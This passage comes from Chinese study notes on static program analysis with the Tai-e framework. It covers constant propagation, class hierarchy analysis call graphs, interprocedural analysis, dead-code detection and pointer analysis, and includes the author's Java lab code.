shiftExp.getOperand1();               Var operand2 = shiftExp.getOperand2();               if (canHoldInt(operand1) &amp;&amp; canHoldInt(operand2)) &#123;                   Value operandValue1 = in.get(operand1);                   Value operandValue2 = in.get(operand2);                   if (operandValue1.isConstant() &amp;&amp; operandValue2.isConstant()) &#123;                       ShiftExp.Op operator = shiftExp.getOperator();                       if(ShiftExp.Op.SHL == operator) &#123;                           return Value.makeConstant(operandValue1.getConstant() &lt;&lt; operandValue2.getConstant());                       &#125; else if (ShiftExp.Op.SHR == operator) &#123;                           return Value.makeConstant(operandValue1.getConstant() &gt;&gt; operandValue2.getConstant());                       &#125; else if (ShiftExp.Op.USHR == operator) &#123;                           return Value.makeConstant(operandValue1.getConstant() &gt;&gt;&gt; operandValue2.getConstant());                       &#125;                   &#125; else if (operandValue1.isNAC() || operandValue2.isNAC()) &#123;                       return Value.getNAC();                   &#125; else &#123;                       return Value.getUndef();                   &#125;               &#125;           &#125; else if (exp instanceof BitwiseExp) &#123;               BitwiseExp bitwiseExp = (BitwiseExp) exp;               Var operand1 = bitwiseExp.getOperand1();               Var operand2 = bitwiseExp.getOperand2();               if (canHoldInt(operand1) &amp;&amp; canHoldInt(operand2)) &#123;                   Value operandValue1 = in.get(operand1);                   Value operandValue2 = in.get(operand2);                   if (operandValue1.isConstant() &amp;&amp; operandValue2.isConstant()) &#123;                       BitwiseExp.Op operator = bitwiseExp.getOperator();                       if (BitwiseExp.Op.AND == operator) &#123;                           return Value.makeConstant(operandValue1.getConstant() &amp; operandValue2.getConstant());                       &#125;else if (BitwiseExp.Op.OR == operator) &#123;                           return Value.makeConstant(operandValue1.getConstant() | operandValue2.getConstant());                       &#125;else if (BitwiseExp.Op.XOR == operator) &#123;                           return Value.makeConstant(operandValue1.getConstant() ^ operandValue2.getConstant());                       &#125;                   &#125;else if (operandValue1.isNAC() || operandValue2.isNAC()) &#123;                       return Value.getNAC();                   &#125;else &#123;                       return Value.getUndef();                   &#125;               &#125;           &#125;       &#125;       // 其他情况暂不考虑 直接返回NAC       return Value.getNAC();   &#125;\n接下来实现transferNode()，利用\n\nOUT[S] = gen\\ U\\ (IN[S]\\{(x,\\_)\\})public boolean transferNode(Stmt stmt, CPFact in, CPFact out) &#123;        // TODO - finish me        if (in == null) &#123;  // ???            return false;        &#125;        // 关注等号左侧为变量且右侧只能是如下几类表达式的 定义为EXP类型的表达式        if (stmt instanceof DefinitionStmt) &#123;            DefinitionStmt definitionStmt = (DefinitionStmt) stmt;            LValue lValue = definitionStmt.getLValue();            RValue rValue = definitionStmt.getRValue();            // 检查左边变量是否需要被kill掉            Var tmpVar = null;            if(lValue instanceof Var) &#123;                tmpVar = (Var) lValue;                in.remove(tmpVar);            &#125;            // 检查右侧表达式新生成的Value并添加进OUT中            Exp expression = null;            if (rValue instanceof Exp) &#123;                expression = (Exp) rValue;            &#125;            Value newResult = evaluate(expression, in);            CPFact tmpFact = new CPFact();            // 深度copy            tmpFact.copyFrom(in);            if (tmpVar!=null &amp;&amp; canHoldInt(tmpVar)) &#123;                tmpFact.update(tmpVar, newResult);            &#125;            // true if this fact changed as a result of the call, otherwise false.            return out.copyFrom(tmpFact);        &#125;else &#123;            // 非赋值语句直接采用复制的操作            return out.copyFrom(in);        &#125;    &#125;\n实现 Worklist 求解器\n\n需要知道的类\npascal.taie.analysis.dataflow.solver.WorkListSolver\n原理按照如图分两部分实现\n\n对于方法Solver.initializeForward(CFG,DataflowResult)实现基本和实验1一致，就是初始化为空。只是注意IN和OUT都要做相同的初始化处理\n对于方法WorkListSolver.doSolveForward(CFG,DataflowResult)，这里注意区别在于当OUT出现变化时，并不是将所有的结点再遍历一次，而是将改变的结点及其后继结点加到worklist当中\n\n\n07- Interprocedural Analysis以往在过程内调用静态分析方法遇到方法调用时往往采用最保守的方式，也就是返回值一定是个NAC（以常数传播为例）\n\n如何构建程序的调用图\nCALL Graph 程序中调用关系的集合\n\n当前构建的算法，越往下精度越高，同时速度也会相对下降\n\nJAVA语言中方法调用的类型，其中virtual call主要是为了实现OO语言的多态特性，因此目标方法只有在运行时才能够确定，所以调用图的关键就是如何处理这个调用类型\n\n\nMethod Dispatch of Virtual Calls\n\n签名的定义如下（soot 采用格式），用于唯一确定方法\n\nDispatch的函数定义，模拟动态运行时具体调用目标方法的过程\n涉及两个参数：调用者类型和方法的签名\n\n\nClass Hierarchy Analysis\n核心思想：根据声明类型去求解目标方法\n去查找A类及其整个继承结构的目标方法\n\n算法：\n\n对于virtual call部分，c和c的所有子类都会去调用dispatch方法，并将结果加入到目标方法\n特征\n\n\n如何用CHA构造整个调用图\n\n具体算法：\n\nexp：\n\n\nInterprocedural Control-Flow Graph\n表示整个程序的结构，作过程间分析\n\nreturn site指的是紧跟着调用方法语句的下一个语句\n\nInterprocedural Data-Flow Analysis 过程间数据流分析\n在transfer function之外增加edge transfer\n\n过程间常量传播（这里仅考虑值传递）\n这里有个细节就是方法调用和返回之间仍存在一条边，便于我们去传递本地的数据流（没有的话则需要在外部调用方法时仍然得保留形参的数据流信息，影响性能）\n\n对于每一个call node，都需要kill掉左边的变量，因为其值会顺着return边重新流回来\n如果不kill掉则会影响精度问题，这里就是将会导致b结果变成NAC\n\n\n\n实验4 类层次结构分析与过程间常量传播需要了解的类\n\npascal.taie.analysis.graph.callgraph.DefaultCallGraph\n该类代表了程序的调用图。它提供了多样的 API（继承自类 AbstractCallGraph）来获取到调用图的信息。另外，它还提供了一些修改调用图的 API，你可以借此来建立调用图。\nStream&lt;Invoke&gt; callSitesIn(JMethod)`：返回给定方法 `JMethod` 中的所有 `call sitesboolean contains(JMethod): 返回当前调用图是否含有给定的方法，即给定方法 JMethod 在当前调用图中是否可达。boolean addReachableMethod(JMethod): 向当前调用图中添加方法 JMethod 并将方法标记成可达的boolean addEdge(Edge&lt;Invoke,JMethod&gt;): 向当前调用图中添加一条调用边\n\npascal.taie.analysis.graph.callgraph.CallKind\n该枚举类型表示调用图中边的种类，包括 INTERFACE、VIRTUAL、SPECIAL 和 STATIC\n\npascal.taie.analysis.graph.callgraph.Edge\n该类表示调用图中的边。每一条边从调用点（call site，Tai-e 中为 Invoke 类型）出发，指向被调用方法（callee method，类型为 JMethod）。在创建一条边的时候，你需要向构造方法提供调用类型、调用点和被调用方法的信息\n\npascal.taie.ir.stmt.Invoke (subclass of Stmt)\n该类表示程序中的方法调用（举个例子：x = o.m(a1,a2,…)）以及调用图中的调用点\n你需要使用 getMethodRef() 来获取目标方法的签名信息\n\npascal.taie.ir.proginfo.MethodRef\nTai-e 中的目标方法引用，如调用点的目标方法。它包含了调用点所调用的目标方法的签名信息。\nJClass getDeclaringClass()：返回该方法签名的声明类，即声明该方法的类Subsignature getSubsignature()：返回被调用方法的子签名（subsignature）\n\npascal.taie.language.classes.JMethod\n该类表示 Tai-e 中的 Java 方法。每个 JMethod 的实例关联着一个方法并包含该方法的各种信息\nboolean isAbstract(): 如果该 JMethod 是一个没有方法体的抽象方法，则返回 true，否则返回 false；\n\npascal.taie.language.classes.JClass\n该类表示 Tai-e 中的 Java 类。每个 JClass 的实例关联着一个类并包含该类的各种信息\nJClass getSuperClass(): 返回该类的父类。如果这个类在类层次结构的顶端（没有父类），比如 java.lang.Object，则返回 null。JMethod getDeclaredMethod(Subsignature): 根据子签名返回该类中声明的对应方法。如果该类中没有该子签名对应的方法，则返回 null。boolean isInterface(): 返回该类是否是一个接口\n\npascal.taie.language.classes.Subsignature\n该类表示 Tai-e 中的子签名。一个方法的子签名只包含它的方法名和方法签名的描述符\n\npascal.taie.language.classes.ClassHierarchy\n该类提供了类层次结构的相关信息\nCollection&lt;JClass&gt; getDirectSubclassesOf(JClass): 对于给定类，返回直接继承该类的子类Collection&lt;JClass&gt; getDirectSubinterfacesOf(JClass) 对于一个给定接口，返回直接继承该接口的子接口。Collection&lt;JClass&gt; getDirectImplementorsOf(JClass): 对于一个给定接口，返回直接实现了该接口的类\n\n需要实现 pascal.taie.analysis.graph.callgraph.CHABuilder 通过CHA 建立调用图\n\ndispatch\n原理如下\n\n实现上采用循环的形式，每次都根据签名判断方法是否存在且是否为非抽象方法\n\nresolve \n你可以使用 CallGraphs.getCallKind(Invoke) 来获得调用点的调用类型\n原理如下\n\n对于前两者调用方法类型，直接dispatch即可；对于后面virtual call，需要先找出当前类的所有子方法和子接口及子接口实现，然后调用dispatch\n\nbuildCallGraph\n算法伪代码如下\n\n这里不好实现的点在获取方法中的所有调用点，因为Stream callSitesIn(JMethod) 这个方法返回的结果没法遍历，一种解决方法是直接拿到method中的IR，然后对IR中的stmt进行逐行判断，如果其类型为Invoke，那就可以说明其是一个call site 然后进行resolve,返回的方法集加入调用图当中即可\n\n\n实现过程间常量传播\n\n解决 Edge Transfer\n为了计算第 4 条语句的 IN fact，也就是方法 addOne() 的 entry 节点的 IN fact，我们需要对 2→4 这条边应用 edge transfer，这样使得第 2 条语句的 OUT fact（a=6）转换为 x=6，并最终 meet 结果 x=6 到第四条语句的 IN fact中。\n\n定义 transferEdge(edge, fact)方法\n\n处理边的种类\n\nNormal edge 一般是与过程间调用无关的边。transferEdge(edge, fact) = fact\nCall-to-return edge 对于方法调用 x = m(…) edge transfer 函数会把等号左侧的变量（在这个例子里也就是 x）和它的值从 fact 中 kill 掉。而对于等号左侧没有变量的调用，则视作恒等函数4\nCall edge  对于这种边，edge transfer 函数会将实参（argument）在调用点中的值传递给被调用函数的形参（parameter）。具体来说，edge transfer 首先从调用点的 OUT fact 中获取实参的值，然后返回一个新的 fact，这个 fact 把形参映射到它对应的实参的值。edge transfer 函数的返回值应该仅包含被调用函数的形参的值\nReturn edge 被调用方法的返回值传递给调用点等号左侧的变量。返回的结果应该仅包含调用点等号左侧变量的值。如果该调用点等号左侧没有变量，那么 edge transfer 函数仅会返回一个空 fact。\n\n需要了解的类\n\npascal.taie.analysis.graph.icfg.ICFGEdge \n有四个子类关联上述的边\npascal.taie.analysis.graph.icfg.NormalEdgepascal.taie.analysis.graph.icfg.CallToReturnEdgepascal.taie.analysis.graph.icfg.CallEdgepascal.taie.analysis.graph.icfg.ReturnEdge\n\npascal.taie.analysis.dataflow.inter.InterDataflowAnalysis\n\npascal.taie.analysis.dataflow.inter.AbstractInterDataflowAnalysis\n它把 ICFG 中不同的点和边分派给对应 transfer 方法\n\n\npascal.taie.ir.exp.InvokeExp\n程序中的方法调用表达式。它包含了被调用的方法引用和传入的各个参数\n\n\n首先要熟悉这几个类型\n\n按照每种类型的进行实现即可，特别说明\ncall-to-return edges 其首先需要kill掉调用点左边的变量，获取方式可以利用Invoke类的getResult方法\n\n对于 Return edges \n首先要对返回的结果做一次meetValue\n\nedge.returnVars() 里面有多个值，这是因为整个方法里的 return 语句都会指向 exit，再从 exit 连接单条 return edge 回上层方法\n\n然后再将值传回给调用点左边的变量，当然如果没有的话就返回一个空 fact\n\n\n实现过程间 Worklist 求解器\n与实验二基本一致，不同点：\n\n在计算一个节点的 IN fact 时，过程间求解器需要对传入的 edge 和前驱们的 OUT facts 应用 edge transfer 函数（transferEdge）\n\n但你仅需要对 ICFG 的 entry 方法（比如 main 方法）的 entry 节点设置 boundary fact\n\n\n\n\n08 - Pointer Analysis\n指针分析\n对于OO语言，指针分析回答了变量可以指向程序中的哪些对象 may-analysis\n输入程序，经过指针分析得到各个指向关系\n\n\n影响指针分析的关键要素\n指标：精度和速度\n\n堆抽象：如何对内存进行建模\n保证指针分析可以终止，避免受到死循环等场景的影响。通过将无穷的对象抽象成有限的（符合某些共性的抽象成一个）\n\n主要技术流派，这里学习Allocation sites\n\nAllocation sites\n在对象创建点（下标表示创建对象的位置）抽象对象来表示动态运行时所创建的对象。因为程序当中的创建点个数一定是有限的，所以可以保证静态分析中抽象对象时有限的\n\n上下文敏感 context sensitivity\n如何对上下文调用进行建模\n​    \n流敏感 Flow Sensitivity\n如何对控制流进行建模\n控制流敏感的会遵循程序执行的顺序，并对每一个执行点维护一个指向关系的映射；而对于非敏感，会忽略掉程序执行的顺序，对整个程序只维护一个指向关系的映射\n\nexp\n\nAnalysis Scope\n应该分析程序中的哪些部分\n前者分析的结果可以适用于所有可能的应用；而对于后者按照需求进行指针分析，得到的结果适用于特定的应用\n\n\n关注的语句 \n只关注直接影响指针指向的语句\n对于数组比较特殊，通常是忽略下标的区别，建模成只有一个单个Field arr，所有的指向关系都存在这里\n\n\n因此只专注于局部变量以及实例的属性，浓缩成下面的语句\n\n调用Call时特别关注Virtual call的情况\n\n\n09 - Pointer Analysis Foundations(I)\n指针分析的规则\nDomains and Notations 域及其记号\n指针由两部分组成 所有变量以及Field\n\n幂集对应指针的集合\n处理四种语句的规则\n横线之上表示前提条件，只要上面的条件满足就可以推导出横线下的语句；没有写表示不需前提条件\n\nNew 将对象$o_i$加入到变量x的指针集当中，箭头表示新的指向关系\n\n\nAssign 对象$o_i$如果原先属于y的指针集的话，在赋值规则中也会将其加入到x变量的指针集当中\n\n\nStore 如果x变量指向$o_i$，变量y指向$o_j$，则将Field $o_i.f$指向$0_j$\n\n\nLoad 如果变量x指向$o_i$，且Field $o_i.f$指向 $o_j$，那么就让变量y指向 $o_j$对象\n\n\n\n\n\n09 - Pointer Analysis - Foundations I\n如何实现指针分析\n指针分析本质就是在指针之间互相传播指向信息\n可以看作之间满足某种包含约束关系\n\n关键点：变量x的指针集更新时，要把变化的信息传播给和x关联的其他指针，如何传播？？\n利用图的数据结构\n\nPointer Flow Graph 指针流图\n结点注意对象指的是抽象对象，流动关系都是may的关系\n\n如何构建边？\n基于程序的语句和对应的规则\nexp\n\n通过PFG，指针分析就可以转换为求解图上的传递闭包关系（利用图的可达性信息）\n构建PFG与在其上进行指向信息的传播两者是相互依赖的，PFG在指针分析过程中是动态更新的\n\n指针分析算法\n\nworklist\nWL的元素为指针变量和其对应的指针项（要加入到变量的指针集中），表示需要被处理的指向信息\n\n先简化看 只看new和赋值语句\n这里注意在赋值语句AddEdge方法中，如果s存在指向关系集，也需要将加入到对应t的指向关系集当中（这里就是加入到worklist中）\n\n处理worklist当中的东西\n这里注意到有个减法操作，表示我们要先将已有的指向关系去重，只添加新增的指向关系\n\n指针集的变化真正是发生在算法第二行处，之后还需要将pts传给n的后继结点\n\n有个细节就是集合操作为什么也需要去重操作？\n指针集中已有的元素已经被传播到对应指针的后继当中了，所以就不需要再去传播一遍，采用差异传播的方式来进行\n\n接下来处理store 和 load\n新的指向信息可能引入新的PFG边，可能的意思是指存在多个变量指向同一个对象$o_j$，其他变量在处理时可能已经构建过这条边\n\nexp（分析基于流不敏感，不关心语句的顺序）\n\n\n\n实验3 死代码检测\n控制流不可达\n检测方法：遍历所在方法的控制流图并标记可达语句\n\n分支不可达\n\nif 语句的条件值是一个常数（利用常量传播得知）\nswitch语句预先对被检测代码应用常量传播分析\n\n\n无用赋值\n一个局部变量在一条语句中被赋值，但再也没有被该语句后面的语句读取、\n检测方式：\n\n我们需要预先对被检测代码施用活跃变量分析。对于一个赋值语句，如果它等号左侧的变量（LHS 变量）是一个无用变量（换句话说，not live），那么我们可以把它标记为一个无用赋值。\n\n需要利用的类\npascal.taie.analysis.graph.cfg.Edge\n本次实验需要考虑四种边的种类 IF_TRUE、IF_FALSE、SWITCH_CASE 和 SWITCH_DEFAULT\n\n如何获取和检查边的种类？\nEdge&lt;Stmt&gt; edge = ...;if (edge.getKind() == Edge.Kind.IF_TRUE) &#123; ... &#125;\n对于 SWITCH_CASE 边，可以通过 getCaseValue() 方法来获取它们对应的 case 分支的条件值\n\npascal.taie.ir.stmt.If(Stmt的子类)\n表示程序中的 if 语句\npascal.taie.ir.stmt.SwitchStmt（Stmt 的子类）\npascal.taie.ir.stmt.AssignStmt\n继承关系如下，所以对于方法调用这种情况的赋值语句我们本次实验不关注，仅关注    AssignStmt这个类即可\n\n思路：这里首先遍历整个控制流图，对于未标记的语句即为不可达代码。遍历方式可以采用DFS或BFS\n在遍历 CFG 时，你需要对当前正在访问的节点使用 CFG.getOutEdgesOf() 来帮助获得之后要被访问的后继节点\n控制流不可达\nTreeSet&lt;Stmt&gt; unreachedStmts = new TreeSet&lt;&gt;(Comparator.comparing(Stmt::getIndex));        for (Stmt stmt : cfg) &#123;            unreachedStmts.add(stmt);        &#125;        TreeSet&lt;Stmt&gt; reachedStmts = new TreeSet&lt;&gt;(Comparator.comparing(Stmt::getIndex));        Stmt entry = cfg.getEntry();        BFS(cfg, reachedStmts, entry);        for (Stmt reachedStmt : reachedStmts) &#123;            unreachedStmts.remove(reachedStmt);        &#125;        // 控制流不可达        for (Stmt unreachedStmt : unreachedStmts) &#123;            deadCode.add(unreachedStmt);        &#125;---private static void BFS(CFG&lt;Stmt&gt; cfg, Set&lt;Stmt&gt; stmts, Stmt curStmt) &#123;        if (!stmts.contains(curStmt)) &#123;            stmts.add(curStmt);            cfg.getOutEdgesOf(curStmt).forEach(outEdge -&gt; &#123;                BFS(cfg, stmts, outEdge.getTarget());            &#125;);        &#125;    &#125;\n对于分支不可达，我们需要预先对被检测代码应用常量传播分析，通过它来告诉我们条件值是否为常量，然后在遍历 CFG 时，我们不进入相应的不可达分支\n条件值的获取利用常量传播分析得到的结果，调用的API为constants.getOutFact()\n通过得到的变量进一步判断是否为常数。你需要对当前正在访问的节点使用 CFG.getOutEdgesOf() 来帮助获得之后要被访问的后继节点。这个 API 返回给定节点在 CFG 上的出边，用它进一步判断是否是经过常量判断可达的出边。这里有一点需要注意，Edge类边本身并不代表表达式类型，而是一种连接关系，想要获得其可以延伸到哪一个结点，调用getTarget()进一步判断\n对于赋值语句，首先只用考虑AssignStmt类，在左边变量存在的情况下，利用活跃变量分析的结果去晒出所有非活跃变量且右边赋值无副作用影响的表达式，即为死代码\n// 无用赋值检测        for (Stmt stmt : cfg) &#123;            if (stmt instanceof AssignStmt) &#123;                AssignStmt assignStmt = (AssignStmt) stmt;                if (assignStmt.getDef().isPresent()) &#123;                    LValue lValue = assignStmt.getLValue();                    RValue rValue = assignStmt.getRValue();                    // 为了检测无用赋值，我们需要预先对被检测代码施用活跃变量分析                    SetFact&lt;Var&gt; outFact = liveVars.getOutFact(assignStmt);                    if (lValue instanceof Var) &#123;                        // 如果非活跃变量，且无副作用                        if (!outFact.contains((Var) lValue)) &#123;                            if (hasNoSideEffect(rValue)) &#123;                                deadCode.add(assignStmt);                            &#125;                        &#125;                    &#125;                &#125;            &#125;        &#125;\n\n\n如何从分支不可达当中剔除掉死循环的部分？\n\n形如while(true)的语句死循环之后其后面的所有语句包括return等就不可达了，但是exit节点仍然应当被加入进来，所以初始化的时候应该是entry和exit都加入\n\n按照前面的写逻辑会有问题，感觉逻辑上是分开的，先筛一遍控制不可达再晒一边分支不可达最后筛无用赋值，这样会导致类似死循环问题由于分支不可达的判断直接抛掉后续的语句，应该是所有分析结果结束之后再做筛选\npublic Set&lt;Stmt&gt; analyze(IR ir) &#123;        // obtain CFG        CFG&lt;Stmt&gt; cfg = ir.getResult(CFGBuilder.ID);        // obtain result of constant propagation        DataflowResult&lt;Stmt, CPFact&gt; constants =                ir.getResult(ConstantPropagation.ID);        // obtain result of live variable analysis        DataflowResult&lt;Stmt, SetFact&lt;Var&gt;&gt; liveVars =                ir.getResult(LiveVariableAnalysis.ID);        // keep statements (dead code) sorted in the resulting set        Set&lt;Stmt&gt; deadCode = new TreeSet&lt;&gt;(Comparator.comparing(Stmt::getIndex));        // TODO - finish me        // Your task is to recognize dead code in ir and add it to deadCode        // 最终可达及活跃代码        Set&lt;Stmt&gt; liveCode = new HashSet&lt;&gt;();        // workList        Queue&lt;Stmt&gt; liveStmts = new LinkedList&lt;&gt;();        // 防止死循环问题导致的后续语句不会被遍历到，所以加入exit        liveStmts.add(cfg.getEntry());        liveStmts.add(cfg.getExit());        while (!liveStmts.isEmpty()) &#123;            boolean addAll = true;            Stmt stmt = liveStmts.poll();            if (liveCode.contains(stmt)) &#123;                // 已经分析过该语句                continue;            &#125; else &#123;                // workList的肯定是活跃stmt                liveCode.add(stmt);            &#125;            if (stmt instanceof AssignStmt&lt;?, ?&gt;) &#123;                LValue lValue = ((AssignStmt&lt;?, ?&gt;) stmt).getLValue();                RValue rValue = ((AssignStmt&lt;?, ?&gt;) stmt).getRValue();                // 获得活跃分析结果                SetFact&lt;Var&gt; outFact = liveVars.getOutFact(stmt);                if (lValue instanceof  Var &amp;&amp; !outFact.contains((Var) lValue) &amp;&amp; hasNoSideEffect(rValue)) &#123;                    // 死代码                    deadCode.add(stmt);                &#125;            &#125; else if (stmt instanceof If) &#123;                ConditionExp condition = ((If) stmt).getCondition();                if (ConstantPropagation.canHoldInt(condition.getOperand1()) &amp;&amp; ConstantPropagation.canHoldInt(condition.getOperand2())) &#123;                    Value value = ConstantPropagation.evaluate(condition, constants.getInFact(stmt));                    // 逐个分支判断                    for (Edge&lt;Stmt&gt; edge : cfg.getOutEdgesOf(stmt)) &#123;                        switch (edge.getKind()) &#123;                            case IF_TRUE -&gt; &#123;                                if (value.isConstant() &amp;&amp; value.getConstant()!=0) &#123;                                    liveStmts.add(edge.getTarget());                                    addAll = false;                                &#125;                            &#125;                            case IF_FALSE -&gt; &#123;                                if (value.isConstant() &amp;&amp; value.getConstant()==0) &#123;                                    liveStmts.add(edge.getTarget());                                    addAll = false;                                &#125;                            &#125;                            default -&gt; throw new AnalysisException(&quot;unknown Kind&quot;);                        &#125;                    &#125;                &#125;            &#125; else if (stmt instanceof SwitchStmt) &#123;                Var var = ((SwitchStmt) stmt).getVar();                if (ConstantPropagation.canHoldInt(var)) &#123;                    // 同 ConstantPropagation.evaluate                    CPFact inFact = constants.getInFact(stmt);                    Value value = inFact.get(var);                    for (Edge&lt;Stmt&gt; edge : cfg.getOutEdgesOf(stmt)) &#123;                        switch (edge.getKind()) &#123;                            case SWITCH_CASE -&gt; &#123;                                if (value.isConstant() &amp;&amp; value.getConstant() == edge.getCaseValue()) &#123;                                    liveStmts.add(edge.getTarget());                                    addAll = false;                                &#125;                            &#125;                            case SWITCH_DEFAULT -&gt; &#123;                                // 如果是默认值则要判断分支值不属于 getCaseValues                                List&lt;Integer&gt; caseValues = ((SwitchStmt) stmt).getCaseValues();                                if (value.isConstant() &amp;&amp; !caseValues.contains(value.getConstant())) &#123;                                    liveStmts.add(edge.getTarget());                                    addAll = false;                                &#125;                            &#125;                            default -&gt; throw new AnalysisException(&quot;unknown Kind&quot;);                        &#125;                    &#125;                &#125;            &#125;            if (addAll) &#123;                // 如果是活跃变量或者赋值语句，或者分支条件值（case）值非常数                liveStmts.addAll(cfg.getSuccsOf(stmt));            &#125;        &#125;        for (Stmt stmt : cfg.getNodes()) &#123;            if (!liveCode.contains(stmt)) &#123;                deadCode.add(stmt);            &#125;        &#125;        return deadCode;    &#125;\n作业5 非上下文敏感指针分析\n新的分析规则\n\n对于数组的索引，无视下标，均视作field字段\n\n假设 $o_i$ 代表一个数组对象，那么我们用表示一个指向数组中所有对象的指针（无论保存在数组的什么位置）。\n\n静态方法. 静态方法的处理与实例方法大体相同，除了1）我们不需要在 receiver object 上进行 dispatch 以解析（resolve）出被调用的方法，2）我们不需要传 receiver object。因为静态方法的处理不需要考虑 receiver object(静态方法中是没有this变量的)，因此它的处理规则也比实例方法更简单。所以相当于只需要传参数和返回值即可\n\n需要了解的类\n\npascal.taie.ir.stmt.DefinitionStmt\n表示程序中所有的定义语句，（包括方法调用的）。在本次作业中，所有影响指针的语句都是这个类的子类\n\n注意 isStatic()可以检查语句调用的对象时实例还是静态字段\n\npascal.taie.ir.exp.Var\n它表示 Tai-e IR 中的变量。对于所有实例字段 loads/stores、数组 loads/stores 或实例调用的 base 变量，这个类提供了一些方便的 API 来查找相关语句。\n\n\npascal.taie.language.classes.JField\n这个类表示程序中的各个字段\n\npascal.taie.analysis.pta.core.heap.Obj\n这个类表示指针分析中的抽象对象，即指针集（points-to sets）中的对象\n\npascal.taie.analysis.pta.core.heap.HeapModel\n这个类表示堆模型（即堆抽象），它用来对堆对象进行建模。你可以使用 HeapModel 的 getObj(New) 方法来获得与它对应的抽象对象（即 Obj）\n\n堆抽象返回值唯一\n\npascal.taie.analysis.pta.ci.PointsToSet\n这个类表示指针集，即指针分析中的 Obj 集合\n\npascal.taie.analysis.pta.ci.Pointer\n这个类表示分析中的指针，即 PFG（指针流图，pointer flow grpah）中的节点。每个指针都与一个指针集相关联，你可以调用 getPointsToSet() 来获得这个指针集\n该类存在4个子类\n\n与下图对应\n\n\npascal.taie.analysis.pta.ci.PointerFlowGraph\n还维护着从变量、静态字段、实例字段、数组索引到相应指针（即 PFG 节点）的映射，因此你可以利用这个类的 API 获得各种指针\n\npascal.taie.analysis.pta.ci.WorkList\n这个类表示指针分析算法中的 worklist\n\npascal.taie.analysis.pta.ci.Solver\n可以使用前面作业中介绍的 DefaultCallGraph 的 API 来修改调用图\n\n\n\n需要实现的API\n\nvoid addReachable(JMethod)\n这里学习一种新的设计模式：访问者模式https://refactoringguru.cn/design-patterns/visitor\n对于不同种类的语句，你需要使用不同的逻辑来处理。\n\nTai-e 的 IR 天然支持访问者模式。具体来说，Tai-e 提供了 pascal.taie.ir.stmt.StmtVisitor 类，这是所有 Stmt 访问者的通用接口，它为所有种类的语句都声明了访问操作。另外，Stmt 的非抽象子类都实现了 accept(StmtVisitor) 方法，因此它们可以回调来自具体访问者的访问操作。\n出于方便，我们提供了 Solver.resolveCallee(Obj,Invoke) 来解析 Java 中静态调用、虚调用、接口调用和特殊调用（static, virtual, interface, and special invocations）的被调用者。\n\n原理如图\n\n先说一下底下的全局数组值都对应哪个变量，RM位于DefaultCallGraph类中，可以通过addReachableMethod方法进行添加；而对于变量S，实验框架为了方便存储和处理，直接关联到了每一个Var上，即内部类RelevantStmts。对于我们想要寻找的语句只需调用对应类型的API即可\n\n在框架里面，因为每个方法都生成了 IR，相应地也会为每个变量添加好 RelevantStmts。这会导致一些空间的消耗，但是因为变量都是局部的，当你访问到一个变量时，其相关语句必然也是 reachable 的\n\n因此我们可以忽略 $S_m$ 的添加，在遍历时即已经添加完成。接下来只需对New,Copy, 以及静态的Inoke,StoreField,LoadField按照对应的规则进行处理即可。\n\n\n\n\n这里特别说明静态方法调用的处理，相比于实例方法调用，少了传递receiver obj 和dispatch的操作，但仍需要找到对应的目标方法。这里可以利用`resolveCallee()`，参考ProcessCall\n\n![image-20221226213615543](静态分析/image-20221226213615543.png)\n\n![image-20221226212915744](静态分析/image-20221226212915744.png)\n\nvoid addPFGEdge(Pointer,Pointer)\n原理如下\n\n\nvoid analyze()\n这个方法实现了 Solve 函数的主要部分，即while循环部分\n不要忘记在这个方法中处理数组 loads/stores。\n这里第一个细节在于遍历 $\\triangle$ 应为propagate的返回值，即对所有变动的指针集中的对象进行分析处理，这里注意一下该函数的返回值即可留意到\n\n接下来在处理实例变量的load和store语句，要辨析x.f = y和y = x.f中对应变量的关系，充分利用指针提供的API\n对于数组的store和load，pointerFlowGraph.getArrayIndex(obj)即可得到数组的下标属性指向的对象\n\nPointsToSet propagate(Pointer,PointsToSet)\n该算法合并了算法中的两个步骤，它首先计算差集（)，然后将 $pts$ 传播到 $pt(p)$ 中。它返回 $\\triangle$作为调用的结果。\n\n\nvoid processCall(Var,Obj)\n\n\n为了保证 soundness，你应该将一个方法中由返回变量（即返回语句中出现的变量）所指向的所有对象传播给其调用点等号左侧的变量。你可以通过相关的 IR 对象获得一个方法的所有返回变量\n\n\n\n10 - Pointer Analysis - Foundations II\n如何处理方法调用\n相对于CHA，指针分析根据实际所指的对象来计算指针集（不光只看声明类型）\n\n实际方法调用时JVM出现的变化\ndispatch实际方法\n传 resolve object\n传参数\n传返回值\n\n\n规则\n\nk即调用点方法的签名，传Receiver object给$m_{this}$，即将实际调用方法的对象传给方法中的this变量。然后进行实参传给形参，为了方便传参都会建立PFG边。最后返回值从目标方法返回返回值变量用$m_{ret}$表示\n为什么this不建边呢？\nReceiver object只会流向它实际调用方法的this变量当中去，但是PFG边的构建是会将所有指向对象都连上，这样会引入很多假的调用关系\n\n那为什么参数和返回值可以连？\n参数无法决定实际调用哪个方法，所以采取保守手段。但是this更精确就不用连\n\n过程间指针分析方法处理\n与CHA类似，指针分析的调用方法处理也是与CALL Graph互相依赖。但后者会从一个入口方法开始，慢慢去探寻可达的方法，最终建立Reachable World，仅在可达方法上作分析\n 算法\n\nentry方法可以理解为程序的入口方法（如main）\nAddReachable() 扩展Reachable World\n\n这里看到在新方法加入时只处理new 和 赋值语句。load和store需要根据指针信息的内容来处理，但前两者不需要所以这里在刚加入时只做这两个处理\nProcessCall(x, o_i) 过程调用，实际就是对上面Rule的实现。x的receiver object的变量，$o_i$就是表示流向x的新对象\n 这里注意在dispatch的时候，虽然引入了新的对象，但是实际寻找的调用目标方法到m的边之前可能已经连过（存在其他的指向对象但是调用的相同的目标方法）\n\n整个算法输出：指针集以及Call Graph\nexp\n初始化\n\n大循环\n处理b的ProcessCall\n\n与CHA 处理的对比\n\nfoo方法内的变化 AddReachable 传参 传返回值\n\n处理剩下的WL中的指向关系\n\n\n\n11 - Pointer Analysis - Context Sensitivity I上下文不敏感指针分析引起的精度下降的问题\n\n\n上下文不敏感不准确的本质\n动态执行时，一个方法可以调用多次，每次调用的上下文均不同（参数 返回点），导致指向不同的对象\n\n上下文敏感模型建模就是能区分不同上下文之间的数据流\n\n最早的策略采用调用栈抽象的方式\n把一系列call sites（调用方法的位置）串起来\n\n通过给予不同方法不同上下文前提，也就标记了方法中的变量也在不同上下文中，指向不同的对象。每个上下文对应一份方法和其中变量的克隆副本\n\n上下文敏感 